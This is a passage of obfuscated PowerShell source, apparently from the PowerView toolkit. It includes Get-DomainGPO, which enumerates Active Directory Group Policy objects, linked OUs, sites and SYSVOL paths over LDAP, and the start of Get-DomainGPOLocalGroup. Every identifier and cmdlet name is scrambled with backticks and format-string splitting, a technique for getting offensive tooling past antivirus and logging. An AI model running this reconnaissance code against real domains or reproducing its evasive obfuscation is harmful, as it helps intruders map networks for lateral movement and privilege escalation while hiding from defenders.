                ${M`em`BErs} = ${_}."PrOp`eRt`I`es"."Me`mbe`Rs" | &("{1}{2}{3}{0}"-f't','Select-','Obje','c') -ExpandProperty ("{0}{1}"-f 'Membe','r') | &("{1}{3}{0}{2}"-f 'c','W','t','here-Obje') { ${_}."a`CTiON" -match 'ADD' } | &("{0}{1}{2}" -f'For','Each-Obje','ct') {
                    if (${_}."s`ID") { ${_}."s`id" }
                    else { ${_}."na`mE" }
                }

                if (${Me`m`BeRS}) {
                    
                    if (${_}."FIlTe`Rs") {
                        ${Fi`l`TERs} = ${_}."fIlTe`RS".("{3}{2}{0}{1}" -f 'Enumera','tor','t','Ge').Invoke() | &("{3}{2}{4}{0}{1}" -f 'jec','t','rEac','Fo','h-Ob') {
                            &("{3}{0}{1}{2}"-f'Ob','j','ect','New-') -TypeName ("{0}{1}{2}" -f'PSOb','j','ect') -Property @{("{0}{1}"-f'Typ','e') = ${_}."Lo`CaL`NaME";("{0}{1}" -f 'Va','lue') = ${_}."nA`ME"}
                        }
                    }
                    else {
                        ${FiLt`E`Rs} = ${nu`LL}
                    }

                    if (${me`mbE`RS} -isnot [System.Array]) { ${mE`mbeRS} = @(${Mem`B`ERs}) }

                    ${g`RoUp`S`XML} = &("{1}{0}{2}" -f'Obj','New-','ect') ("{1}{0}"-f 'ect','PSObj')
                    ${groUP`Sx`ML} | &("{2}{1}{0}" -f'ember','d-M','Ad') ("{0}{1}{2}"-f'Notepr','o','perty') ("{2}{0}{1}" -f'OP','ath','GP') ${tArGe`Tg`R`Oup`sxmLPatH}
                    ${g`ROuPS`X`Ml} | &("{0}{1}{2}"-f 'Add','-Membe','r') ("{2}{1}{0}" -f 'ty','er','Noteprop') ("{1}{2}{0}"-f'ers','Fi','lt') ${FI`l`TeRs}
                    ${g`Ro`UPSxmL} | &("{2}{0}{1}"-f'dd-Me','mber','A') ("{2}{0}{3}{1}"-f 'r','y','Notep','opert') ("{1}{0}"-f'e','GroupNam') ${g`ROUP`NaMe}
                    ${g`ROu`psXMl} | &("{2}{1}{0}"-f 'ember','dd-M','A') ("{1}{3}{0}{2}"-f'ropert','No','y','tep') ("{2}{1}{0}"-f 'SID','roup','G') ${g`RO`UpsID}
                    ${g`ROuP`SxML} | &("{0}{2}{1}" -f'Ad','-Member','d') ("{2}{0}{1}"-f 'p','erty','Notepro') ("{2}{3}{0}{1}" -f 'ember','Of','Group','M') ${n`ULL}
                    ${grOu`pS`xmL} | &("{0}{1}{2}{3}" -f 'A','dd-Memb','e','r') ("{1}{2}{0}" -f'property','No','te') ("{3}{0}{2}{1}"-f 'oup','rs','Membe','Gr') ${m`E`MbErs}
                    ${GROuP`S`xmL}."PsO`Bj`EcT"."t`yPeNA`Mes".("{1}{0}" -f 't','Inser').Invoke(0, ("{4}{2}{0}{5}{1}{3}"-f'erVi','X','w','ML','Po','ew.Groups'))
                    ${G`Roup`sXML}
                }
            }
        }
        catch {
            &("{1}{4}{2}{0}{3}"-f's','W','Verbo','e','rite-') ('[Get-G'+'ro'+'u'+'psX'+'ML] '+'E'+'rror '+'p'+'arsing'+' '+"$TargetGroupsXMLPath "+': '+"$_")
        }
    }

    END {
        
        ${mApp`EdPA`ThS}."K`eyS" | &("{0}{2}{1}{3}"-f'For','ch-Obje','Ea','ct') { &("{1}{4}{2}{0}{3}"-f 'ctio','Remov','ne','n','e-RemoteCon') -Path ${_} }
    }
}


function GE`T-DOMaIng`Po {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{4}{3}{0}{1}"-f 'r','ocess','PSS','dP','houl'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{6}{2}{1}{4}{5}{3}"-f 'PSUs','laredVarsM','c','ignments','o','reThanAss','eDe'}, '')]
    [OutputType({"{1}{2}{0}" -f 'O','Powe','rView.GP'})]
    [OutputType({"{2}{1}{0}{3}"-f 'rVi','e','Pow','ew.GPO.Raw'})]
    [CmdletBinding(dEFAuLTpArAmeTErsEtnAMe = {"{0}{1}" -f 'N','one'})]
    Param(
        [Parameter(POSiTiON = 0, vAlUEfROMPiPELInE = ${tR`UE}, VALuEFroMpIpELiNEbYproPERTyName = ${t`RuE})]
        [Alias({"{0}{4}{2}{1}{3}" -f'D','nguishedNa','i','me','ist'}, {"{2}{0}{1}{3}" -f'cou','n','SamAc','tName'}, {"{0}{1}" -f 'Nam','e'})]
        [String[]]
        ${iDEnt`itY},

        [Parameter(PaRAmEteRsEtnAme = "C`om`PUtERid`ent`Ity")]
        [Alias({"{0}{1}{2}"-f 'Compute','rNa','me'})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${CoMp`U`T`eRIDe`NtITY},

        [Parameter(PArAMetERSETnaME = "u`SerId`entI`Ty")]
        [Alias({"{2}{1}{0}" -f'e','am','UserN'})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${UsE`R`IdentI`TY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`OMAin},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}" -f'Fi','er','lt'})]
        [String]
        ${ldaPF`IL`TEr},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${PROPe`RT`iES},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}"-f 'h','AD','SPat'})]
        [String]
        ${sEA`Rc`HbASe},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{3}{1}{2}"-f 'Domai','nt','roller','nCo'})]
        [String]
        ${sErv`eR},

        [ValidateSet({"{1}{0}" -f'se','Ba'}, {"{1}{0}{2}" -f'eve','OneL','l'}, {"{2}{0}{1}"-f 'btr','ee','Su'})]
        [String]
        ${s`eARC`hS`CoPE} = ("{2}{0}{1}"-f'btre','e','Su'),

        [ValidateRange(1, 10000)]
        [Int]
        ${r`Esul`TpAgE`S`iZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${serVe`RTI`MEli`M`iT},

        [ValidateSet({"{1}{0}"-f 'acl','D'}, {"{0}{1}"-f 'Gr','oup'}, {"{1}{0}"-f 'ne','No'}, {"{0}{1}" -f 'Owne','r'}, {"{1}{0}" -f'acl','S'})]
        [String]
        ${s`Ecur`itYMaSks},

        [Switch]
        ${T`O`MBstone},

        [Alias({"{1}{0}"-f 'eturnOne','R'})]
        [Switch]
        ${fI`NDo`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cRE`dEN`TIAl} =  (&("{1}{0}" -f 'ci','G') ("{3}{1}{2}{4}{0}"-f '6','lE:','jh3','vaRiaB','XO'))."vA`Lue"::"e`mpty",

        [Switch]
        ${r`Aw}
    )

    BEGIN {
        ${S`EaR`C`heraRguM`EntS} = @{}
        if (${psb`OUn`Dp`AraMeteRS}[("{0}{2}{1}"-f'D','main','o')]) { ${s`EAR`cHe`RArgU`mEnTS}[("{0}{1}"-f'Dom','ain')] = ${Do`MaIN} }
        if (${psBo`UndpA`R`AMeters}[("{1}{2}{0}"-f'rties','Prop','e')]) { ${sEA`Rc`HerARGuM`ents}[("{2}{0}{1}" -f 'p','erties','Pro')] = ${p`R`opERt`ieS} }
        if (${PsBoU`Nd`pARa`METerS}[("{2}{0}{1}"-f 'ar','chBase','Se')]) { ${SEArC`heR`ARguMe`NtS}[("{0}{2}{1}"-f 'Se','hBase','arc')] = ${sE`Ar`ChBAsE} }
        if (${Ps`Bou`NDp`ARameTErS}[("{0}{1}" -f 'Serve','r')]) { ${seARCher`A`R`GuMEnTs}[("{1}{0}" -f'er','Serv')] = ${SERv`Er} }
        if (${p`SboU`NDparAMeT`e`Rs}[("{0}{1}{2}"-f'Se','ar','chScope')]) { ${sEaR`C`H`ER`ARGuMenTs}[("{2}{1}{0}{3}"-f'rc','ea','S','hScope')] = ${s`ea`RCH`Scope} }
        if (${p`S`B`O`UN`DPAraMeTers}[("{2}{3}{0}{1}" -f 'g','eSize','Re','sultPa')]) { ${SeA`Rc`hERa`R`GUME`Nts}[("{0}{1}{2}"-f 'R','esult','PageSize')] = ${r`es`U`ltpaGeSIZE} }
        if (${P`sbOu`N`DpAraM`e`TERs}[("{2}{0}{1}{3}" -f'erv','erTimeLimi','S','t')]) { ${s`eA`RcHERaR`gum`e`NTS}[("{0}{1}{2}"-f 'Se','rverTimeLi','mit')] = ${s`E`RvErtiMElIM`IT} }
        if (${PsBou`Ndp`ARAm`EtERs}[("{0}{2}{1}" -f'Security','sks','Ma')]) { ${S`earcH`er`ArGU`ME`NtS}[("{3}{2}{0}{1}"-f 'urityM','asks','ec','S')] = ${se`cUR`ITy`MASkS} }
        if (${PS`BOuNdpara`mETe`Rs}[("{0}{1}{2}" -f 'T','ombsto','ne')]) { ${S`EArCHerARG`U`Me`NTs}[("{2}{1}{0}" -f'tone','mbs','To')] = ${t`oM`BStONE} }
        if (${pSBoUnd`P`Ar`Am`e`TeRs}[("{0}{1}{2}" -f'C','red','ential')]) { ${SE`AR`Ch`ERarg`UMENts}[("{1}{3}{0}{2}" -f 'ia','C','l','redent')] = ${C`REDE`NtI`AL} }
        ${GPoSEa`R`chER} = &("{1}{4}{2}{3}{0}" -f 'archer','G','Domain','Se','et-') @SearcherArguments
    }

    PROCESS {
        if (${gPOs`EA`RCh`ER}) {
            if (${psb`OUNdp`ArA`M`ETe`RS}[("{4}{0}{3}{1}{2}"-f'om','Id','entity','puter','C')] -or ${pSBOUndPar`AM`Et`eRs}[("{3}{2}{0}{1}" -f'nt','ity','rIde','Use')]) {
                ${G`PoAdSp`AtHS} = @()
                if (${Se`ARCherargUm`EN`TS}[("{1}{2}{0}"-f 'es','Propert','i')]) {
                    ${old`pR`oP`eR`TIes} = ${Se`Arc`H`EraRG`UM`eNts}[("{1}{0}{2}" -f 'perti','Pro','es')]
                }
                ${seA`RC`heRArGU`ments}[("{1}{2}{0}"-f 'es','Propert','i')] = ("{5}{1}{4}{3}{6}{2}{0}" -f 'tname','istinguish','hos','me','edna','d',',dns')
                ${TA`Rge`TCOMpute`R`NaMe} = ${n`UlL}

                if (${PSbOu`N`dp`ARAMEteRS}[("{1}{0}{2}{4}{3}"-f 'uterIden','Comp','ti','y','t')]) {
                    ${s`EARCH`ERARGum`E`N`TS}[("{2}{1}{0}"-f 'y','ntit','Ide')] = ${CO`MP`Ut`er`ide`NtiTY}
                    ${CoM`P`UTER} = &("{5}{1}{4}{2}{0}{3}"-f'e','m','omput','r','ainC','Get-Do') @SearcherArguments -FindOne | &("{2}{1}{3}{0}"-f't','e','Sel','ct-Objec') -First 1
                    if(-not ${COMPUT`er}) {
                        &("{4}{3}{1}{0}{2}" -f 'erbos','e-V','e','t','Wri') ('[Get-Do'+'m'+'ai'+'nGP'+'O] '+'Compu'+'te'+'r '+"'$ComputerIdentity' "+'n'+'ot '+'fo'+'un'+'d!')
                    }
                    ${o`BJectDn} = ${c`o`M`pUtEr}."Di`sti`NgUIshE`d`NAMe"
                    ${tA`R`G`ETcom`PUTeR`NAme} = ${c`OMP`UTER}."dns`hOStN`AME"
                }
                else {
                    ${SeaRcHE`R`ArgUM`E`NtS}[("{1}{0}"-f'ty','Identi')] = ${Us`ErId`ENtItY}
                    ${u`SeR} = &("{0}{3}{1}{2}"-f 'Get-Domai','se','r','nU') @SearcherArguments -FindOne | &("{3}{0}{2}{1}" -f'-Obje','t','c','Select') -First 1
                    if(-not ${U`SeR}) {
                        &("{0}{2}{3}{1}" -f'Write','e','-Verb','os') ('['+'Get'+'-Dom'+'ainGPO] '+'Use'+'r '+"'$UserIdentity' "+'not'+' '+'fo'+'und!')
                    }
                    ${OBj`ECTdn} = ${uS`Er}."diS`TINgUIsH`E`D`NAMe"
                }

                
                ${OB`jEcto`US} = @()
                ${o`B`jEctoUS} += ${Obj`EC`TdN}.("{1}{0}"-f't','spli').Invoke(',') | &("{2}{0}{1}{3}" -f'ch','-Obj','ForEa','ect') {
                    if(${_}.("{2}{1}{0}" -f 'ith','w','starts').Invoke('OU=')) {
                        ${ob`je`ct`DN}.("{0}{2}{1}" -f'SubSt','g','rin').Invoke(${OBj`eC`TDn}.("{0}{1}{2}" -f'In','de','xOf').Invoke("$($_),"))
                    }
                }
                &("{0}{1}{2}"-f 'Writ','e-Verbo','se') ('[Get-D'+'omainG'+'P'+'O] '+'obje'+'ct '+'OUs:'+' '+"$ObjectOUs")

                if (${ob`jecTo`US}) {
                    
                    ${SEA`RCherAr`G`U`mE`NtS}.("{1}{0}"-f'emove','R').Invoke(("{1}{0}{2}" -f 'rtie','Prope','s'))
                    ${inH`EritAnc`edIsAB`Led} = ${Fa`lsE}
                    ForEach(${OB`JE`ctOU} in ${objEC`TO`US}) {
                        ${Se`A`Rch`eraRGUM`EN`TS}[("{2}{1}{0}" -f 'ity','ent','Id')] = ${OBjec`Tou}
                        ${GPO`ADsP`A`THs} += &("{0}{2}{1}" -f'Ge','OU','t-Domain') @SearcherArguments | &("{3}{1}{4}{0}{2}" -f 'h-','or','Object','F','Eac') {
                            
                            if (${_}."g`PLi`NK") {
                                ${_}."gpl`iNk"."S`PLit"('][') | &("{1}{0}{2}{3}{4}" -f'rEac','Fo','h-','Ob','ject') {
                                    if (${_}.("{3}{1}{0}{2}"-f'it','sw','h','start').Invoke(("{1}{0}" -f'AP','LD'))) {
                                        ${p`A`RtS} = ${_}.("{0}{1}" -f's','plit').Invoke(';')
                                        ${gp`Odn} = ${pA`R`Ts}[0]
                                        ${EnFo`R`cED} = ${PA`R`TS}[1]

                                        if (${i`N`hERITAn`Ce`di`sAbled}) {
                                            
                                            
                                            if (${eNFo`R`CeD} -eq 2) {
                                                ${g`p`Odn}
                                            }
                                        }
                                        else {
                                            
                                            ${gP`Odn}
                                        }
                                    }
                                }
                            }

                            
                            if (${_}."GpO`pti`Ons" -eq 1) {
                                ${I`NheriTA`NCED`ISABL`ed} = ${T`RuE}
                            }
                        }
                    }
                }

                if (${tARG`etcOMput`er`NaMe}) {
                    
                    ${ComPut`E`RSITe} = (&("{3}{2}{0}{4}{1}" -f't','SiteName','-Ne','Get','Computer') -ComputerName ${ta`RG`et`comP`UteRNa`mE})."Si`TeN`AmE"
                    if(${Co`mpUT`e`RsItE} -and (${coM`pU`T`ERSI`Te} -notlike ("{0}{1}"-f'E','rror*'))) {
                        ${s`eAr`CHeRArGu`mENTS}[("{0}{1}" -f'Id','entity')] = ${CoMP`Ut`ErSI`TE}
                        ${gpo`AD`spAT`hS} += &("{3}{2}{0}{4}{1}"-f 'mai','Site','o','Get-D','n') @SearcherArguments | &("{1}{3}{0}{2}"-f '-','For','Object','Each') {
                            if(${_}."G`pL`iNK") {
                                
                                ${_}."GpL`Ink"."SPL`iT"('][') | &("{1}{3}{4}{2}{0}" -f'ct','F','e','orEach-','Obj') {
                                    if (${_}.("{0}{3}{2}{1}"-f's','ith','w','tarts').Invoke(("{0}{1}"-f 'LD','AP'))) {
                                        ${_}.("{0}{1}" -f'spli','t').Invoke(';')[0]
                                    }
                                }
                            }
                        }
                    }
                }

                
                ${O`BjeC`TDOMAInDn} = ${o`BJE`ctdN}.("{2}{0}{1}" -f'n','g','SubStri').Invoke(${OBj`ec`TDn}.("{2}{1}{0}" -f 'xOf','de','In').Invoke('DC='))
                ${SE`A`RChEr`ARGum`ENTS}.("{0}{1}"-f 'Rem','ove').Invoke(("{1}{0}"-f'entity','Id'))
                ${seARcH`Er`A`RGuMen`Ts}.("{1}{0}" -f'ove','Rem').Invoke(("{2}{3}{0}{1}" -f'ert','ies','Pr','op'))
                ${SEA`RC`hE`RARgUm`ents}[("{0}{2}{1}"-f 'LD','PFilter','A')] = "(objectclass=domain)(distinguishedname=$ObjectDomainDN)"
                ${gp`oad`SPA`THS} += &("{1}{3}{0}{2}" -f'i','Get-','nObject','Doma') @SearcherArguments | &("{1}{2}{0}{3}" -f 'Each','Fo','r','-Object') {
                    if(${_}."GpLI`NK") {
                        
                        ${_}."Gpl`I`NK"."S`PLIt"('][') | &("{1}{0}{2}{3}"-f 'orE','F','ach-Ob','ject') {
                            if (${_}.("{0}{1}{2}"-f 'st','arts','with').Invoke(("{1}{0}" -f 'AP','LD'))) {
                                ${_}.("{0}{1}"-f 's','plit').Invoke(';')[0]
                            }
                        }
                    }
                }
                &("{1}{0}{2}"-f 'Verbos','Write-','e') ('[Ge'+'t-Domai'+'nG'+'PO]'+' '+'GPOA'+'dsPaths:'+' '+"$GPOAdsPaths")

                
                if (${oLD`ProPert`IES}) { ${sEAr`ch`era`RgUmEN`Ts}[("{2}{1}{0}" -f'perties','ro','P')] = ${Ol`DP`RO`pertIeS} }
                else { ${S`EAR`CHerarGuM`ENTs}.("{0}{1}{2}"-f 'Re','mo','ve').Invoke(("{0}{2}{1}" -f'Prope','ies','rt')) }
                ${sE`ArC`HEr`Ar`G`UmENTs}.("{1}{0}"-f'emove','R').Invoke(("{1}{0}"-f 'dentity','I'))

                ${GPOadSP`AT`Hs} | &("{3}{1}{0}{2}" -f'Ob','ere-','ject','Wh') {${_} -and (${_} -ne '')} | &("{4}{0}{1}{2}{3}"-f 'a','c','h','-Object','ForE') {
                    
                    ${SEARC`herarg`U`m`EntS}[("{3}{0}{1}{2}"-f 'h','Bas','e','Searc')] = ${_}
                    ${s`EArc`H`eRarGUME`Nts}[("{1}{2}{3}{0}" -f 'er','L','DA','PFilt')] = ("{4}{9}{2}{6}{1}{8}{7}{3}{5}{0}{10}" -f 'tain','t','e','cyC','(o','on','c','=groupPoli','Category','bj','er)')
                    &("{1}{2}{3}{0}" -f 't','Ge','t-Dom','ainObjec') @SearcherArguments | &("{2}{1}{0}"-f 'Each-Object','or','F') {
                        if (${psB`oU`NdparAME`TE`RS}['Raw']) {
                            ${_}."P`s`OBJECt"."t`y`PeNaMEs".("{2}{1}{0}" -f 't','ser','In').Invoke(0, ("{4}{3}{0}{2}{1}" -f 'i','aw','ew.GPO.R','rV','Powe'))
                        }
                        else {
                            ${_}."pSOB`JeCT"."tYP`e`NAmeS".("{0}{1}"-f'Inse','rt').Invoke(0, ("{1}{2}{0}"-f'GPO','P','owerView.'))
                        }
                        ${_}
                    }
                }
            }
            else {
                ${idE`N`TItyf`IlT`er} = ''
                ${fil`T`Er} = ''
                ${iden`T`I`TY} | &("{3}{2}{1}{0}"-f 'ect','bj','here-O','W') {${_}} | &("{1}{4}{2}{0}{3}" -f'h-Obje','F','ac','ct','orE') {
                    ${IDEnTIT`Y`InSTa`NCe} = ${_}.("{0}{1}{2}" -f 'R','epla','ce').Invoke('(', '\28').("{1}{0}{2}" -f 'e','R','place').Invoke(')', '\29')
                    if (${i`deNtiT`yI`NstAn`Ce} -match ((("{1}{2}{3}{0}"-f 'g^CN=.*','LDAP','://','YL'))  -CREplaCe 'YLg',[chAr]124)) {
                        ${iD`ENTitY`F`ilTEr} += "(distinguishedname=$IdentityInstance)"
                        if ((-not ${p`SBou`NdpA`RAM`etErs}[("{1}{0}"-f 'n','Domai')]) -and (-not ${Psbo`UnDpaRa`m`ETE`Rs}[("{1}{0}{2}"-f'chBa','Sear','se')])) {
                            
                            
                            ${IdENT`I`T`Y`dOMAIn} = ${IdENt`ity`insTA`NCe}.("{1}{0}{2}" -f'rin','SubSt','g').Invoke(${idEn`T`it`YINs`Ta`NcE}.("{2}{1}{0}"-f 'Of','dex','In').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                            &("{0}{1}{3}{2}" -f 'Wri','te-Verbo','e','s') ('[Get-'+'Dom'+'a'+'i'+'nGPO]'+' '+'E'+'xtracte'+'d'+' '+'dom'+'ai'+'n '+"'$IdentityDomain' "+'from'+' '+"'$IdentityInstance'")
                            ${sEaRcHE`R`ArGu`meNTs}[("{0}{1}" -f 'Doma','in')] = ${Id`eNTIT`yD`OMain}
                            ${gp`OSEA`R`cHeR} = &("{4}{2}{0}{1}{3}"-f'nSea','rch','mai','er','Get-Do') @SearcherArguments
                            if (-not ${gPo`SeA`RcH`er}) {
                                &("{4}{1}{2}{3}{0}"-f'g','rite-War','ni','n','W') ('[Ge'+'t-D'+'o'+'mainGPO'+'] '+'Una'+'ble'+' '+'t'+'o '+'retri'+'eve'+' '+'d'+'omai'+'n '+'sea'+'rche'+'r '+'for'+' '+"'$IdentityDomain'")
                            }
                        }
                    }
                    elseif (${i`deN`T`I`TYi`NstAnCe} -match '{.*}') {
                        ${i`DEntiTyfI`lt`eR} += "(name=$IdentityInstance)"
                    }
                    else {
                        try {
                            ${GUIDBy`Te`St`RInG} = (-Join (([Guid]${iDentI`T`yIn`StAN`CE}).("{1}{2}{0}" -f'ay','ToB','yteArr').Invoke() | &("{3}{2}{1}{4}{0}" -f 'bject','ch','a','ForE','-O') {${_}.("{0}{1}" -f'ToStr','ing').Invoke('X').("{2}{0}{1}" -f'dLe','ft','Pa').Invoke(2,'0')})) -Replace ("{0}{1}"-f'(.','.)'),'\$1'
                            ${IdE`Nti`TY`FILtEr} += "(objectguid=$GuidByteString)"
                        }
                        catch {
                            ${iD`E`NTItyfI`lTEr} += "(displayname=$IdentityInstance)"
                        }
                    }
                }
                if (${ID`eN`TItYFiL`T`Er} -and (${iDEntit`YfIlt`Er}.("{0}{1}"-f 'Tri','m').Invoke() -ne '') ) {
                    ${F`IlT`eR} += "(|$IdentityFilter)"
                }

                if (${p`sboUN`Dp`AR`AMetERS}[("{0}{2}{1}" -f 'LDAPF','lter','i')]) {
                    &("{1}{3}{0}{2}" -f'te-Verbos','W','e','ri') ('[G'+'et'+'-'+'DomainGPO]'+' '+'U'+'sing '+'additi'+'on'+'a'+'l '+'LDA'+'P '+'fi'+'lte'+'r: '+"$LDAPFilter")
                    ${F`ILtER} += "$LDAPFilter"
                }

                ${GpoS`E`ARchER}."fILT`Er" = "(&(objectCategory=groupPolicyContainer)$Filter)"
                &("{2}{1}{0}{3}" -f 'b','-Ver','Write','ose') "[Get-DomainGPO] filter string: $($GPOSearcher.filter) "

                if (${p`SBoUn`dpARAmEte`RS}[("{0}{1}{2}"-f 'Fi','nd','One')]) { ${rEsu`Lts} = ${GP`O`SEAR`CheR}.("{0}{1}"-f 'Fi','ndOne').Invoke() }
                else { ${REs`U`ltS} = ${gPOS`e`ARch`eR}.("{1}{0}"-f'l','FindAl').Invoke() }
                ${rE`SUL`Ts} | &("{0}{1}{2}"-f 'Wh','ere-','Object') {${_}} | &("{0}{1}{4}{3}{2}" -f 'ForEac','h-','t','bjec','O') {
                    if (${pSbou`NDPArA`Me`TeRS}['Raw']) {
                        
                        ${g`Po} = ${_}
                        ${g`pO}."Ps`ob`JecT"."tY`PenaM`ES".("{1}{0}{2}" -f'se','In','rt').Invoke(0, ("{0}{3}{1}{4}{2}" -f'Po','ew','O.Raw','werVi','.GP'))
                    }
                    else {
                        if (${psBOuN`DPARa`m`eteRs}[("{2}{0}{1}" -f'earchBas','e','S')] -and (${seA`Rch`BaSE} -Match ("{1}{0}"-f 'C://','^G'))) {
                            ${g`po} = &("{0}{4}{1}{3}{2}"-f'C','-','roperty','LDAPP','onvert') -Properties ${_}."Pr`OP`ERtIEs"
                            try {
                                ${gP`O`Dn} = ${G`PO}."dISTi`NGu`ISHe`dn`Ame"
                                ${G`podoM`AIn} = ${g`Podn}.("{0}{2}{1}" -f'Su','ng','bStri').Invoke(${g`PodN}.("{0}{1}"-f'I','ndexOf').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                                ${GpCFIl`ESy`s`PAtH} = "\\$GPODomain\SysVol\$GPODomain\Policies\$($GPO.cn)"
                                ${G`po} | &("{1}{0}{2}"-f 'dd','A','-Member') ("{1}{0}{2}" -f'rop','Notep','erty') ("{0}{2}{3}{1}" -f'gpcfile','h','sy','spat') ${gp`cfI`l`ESYSpa`TH}
                            }
                            catch {
                                &("{4}{2}{3}{0}{1}"-f 'erb','ose','rite','-V','W') "[Get-DomainGPO] Error calculating gpcfilesyspath for: $($GPO.distinguishedname) "
                            }
                        }
                        else {
                            ${g`PO} = &("{1}{3}{5}{4}{0}{2}" -f'er','Convert','ty','-LD','p','APPro') -Properties ${_}."PRopER`T`ies"
                        }
                        ${G`po}."PS`oBJ`eCT"."T`y`pENAM`Es".("{1}{0}"-f 'sert','In').Invoke(0, ("{2}{0}{1}{3}"-f'owerV','iew.','P','GPO'))
                    }
                    ${g`Po}
                }
                if (${Res`UL`TS}) {
                    try { ${R`E`sulTs}.("{0}{1}{2}"-f'di','spo','se').Invoke() }
                    catch {
                        &("{1}{2}{4}{3}{0}"-f'se','W','r','-Verbo','ite') ('[Get-Do'+'main'+'GPO'+'] '+'Er'+'ro'+'r '+'di'+'spo'+'sing '+'of'+' '+'the'+' '+'Resu'+'lt'+'s '+'o'+'bject:'+' '+"$_")
                    }
                }
                ${G`pOsEA`RchEr}.("{2}{0}{1}" -f'spos','e','di').Invoke()
            }
        }
    }
}


function Get-DOm`A`ing`POLO`caLgROuP {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{0}{3}{1}{2}"-f'S','uldPro','cess','Sho','P'}, '')]
    [OutputType({"{4}{2}{3}{0}{1}" -f 'G','roup','o','werView.GPO','P'})]
    [CmdletBinding()]
    Param(
        [Parameter(posiTion = 0, vALUEfROmpIpElIne = ${t`RUe}, vaLuefRoMPIPelinebYPRoPeRtynaMe = ${t`RUe})]
        [Alias({"{1}{3}{2}{0}{4}"-f 'd','Di','he','stinguis','Name'}, {"{3}{2}{0}{1}" -f'nt','Name','u','SamAcco'}, {"{0}{1}" -f 'N','ame'})]
        [String[]]
        ${i`dE`NTiTy},

        [Switch]
        ${Re`sOlVemEMbeR`S`T`os`I`dS},

        [ValidateNotNullOrEmpty()]
        [String]
        ${DO`maiN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f'er','Filt'})]
        [String]
        ${ld`APFi`L`Ter},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}"-f'SPa','AD','th'})]
        [String]
        ${S`ea`R`chbase},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{3}{0}"-f'roller','Domain','C','ont'})]
        [String]
        ${SER`V`Er},

        [ValidateSet({"{0}{1}" -f'B','ase'}, {"{0}{2}{1}"-f 'One','vel','Le'}, {"{2}{1}{0}" -f 'ree','ubt','S'})]
        [String]
        ${se`Ar`cHscOpE} = ("{1}{0}"-f'tree','Sub'),

        [ValidateRange(1, 10000)]
        [Int]
        ${res`U`LTPagESi`zE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SE`RV`ERT`imeLiMit},

        [Switch]
        ${to`MbS`ToNE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`RedenT`IAl} =   (&("{2}{0}{1}" -f'ab','le','vArI')  ("jH3XO"+"6") -val )::"emP`Ty"
    )

    BEGIN {
        ${seaRcHeRaR`GU`M`e`NTS} = @{}
        if (${Psbo`UnDpARA`M`e`TeRS}[("{1}{0}{2}" -f 'm','Do','ain')]) { ${seAr`Ch`erarg`UMe`N`Ts}[("{0}{1}" -f 'D','omain')] = ${dOm`AiN} }
        if (${PSbo`U`NdPaRamET`eRs}[("{0}{1}{2}"-f'L','DAPFi','lter')]) { ${SEA`Rc`hErarg`UM`En`TS}[("{2}{1}{0}"-f 'ter','APFil','LD')] = ${doMa`IN} }
        if (${PsBounDp`Ar`AmE`T`ERS}[("{1}{2}{0}"-f 'e','Sear','chBas')]) { ${SeA`RChE`R`A`RGUmENts}[("{1}{0}{2}"-f 'rchBa','Sea','se')] = ${SE`Ar`ch`BASe} }
        if (${PsB`O`U`NDParameTE`RS}[("{2}{1}{0}"-f'er','rv','Se')]) { ${S`eaRc`HER`A`RGu`mEnts}[("{1}{0}"-f'r','Serve')] = ${S`er`VEr} }
        if (${pS`BoU`NDPA`Ram`e`Ters}[("{2}{0}{1}" -f 'earchScop','e','S')]) { ${sEA`R`ChE`R`A`RguMentS}[("{0}{2}{1}{3}" -f'S','rchSco','ea','pe')] = ${seAr`ChSC`oPe} }
        if (${PsBo`UnDpAr`AMeT`eRS}[("{2}{3}{0}{1}" -f'Siz','e','Result','Page')]) { ${S`e`ARCheRarG`Um`e`Nts}[("{3}{2}{4}{0}{1}"-f 'z','e','tPage','Resul','Si')] = ${rE`sU`lt`PAgesi`Ze} }
        if (${PS`B`O`Undpar`AMETE`RS}[("{1}{2}{0}{3}" -f 'im','ServerT','imeL','it')]) { ${s`e`ArChe`Ra`Rgu`MeNTs}[("{1}{3}{2}{0}" -f 'rTimeLimit','S','ve','er')] = ${SERv`ErtiM`EliM`It} }
        if (${PSB`o`UNDpa`RamEtERS}[("{2}{0}{3}{1}" -f'o','tone','T','mbs')]) { ${Se`ArChER`AR`GUMENtS}[("{3}{0}{1}{2}" -f 'mb','st','one','To')] = ${T`o`m`BstOne} }
        if (${PSBo`UnDPAra`mE`T`ERs}[("{1}{2}{0}{3}" -f'nt','Cred','e','ial')]) { ${searCHERa`Rg`U`m`eN`TS}[("{0}{2}{1}" -f 'Crede','l','ntia')] = ${c`RED`EnTiAl} }

        ${COnVeR`TaRG`Um`EN`TS} = @{}
        if (${Ps`BOuN`dpaRame`TE`RS}[("{0}{2}{1}"-f 'Dom','n','ai')]) { ${con`VERtAr`GU`MENts}[("{1}{0}" -f 'in','Doma')] = ${doMA`iN} }
        if (${pSb`ouND`paR`A`mETeRs}[("{1}{0}{2}" -f'erv','S','er')]) { ${coN`Ver`T`ARGUMe`NTs}[("{0}{1}"-f'Serve','r')] = ${SeRV`er} }
        if (${PSBOuNd`P`Aram`e`TeRS}[("{1}{0}{2}"-f'n','Crede','tial')]) { ${coNvE`RTa`R`gU`ME`NTs}[("{1}{0}{2}"-f 'de','Cre','ntial')] = ${CRED`EN`T`IAl} }

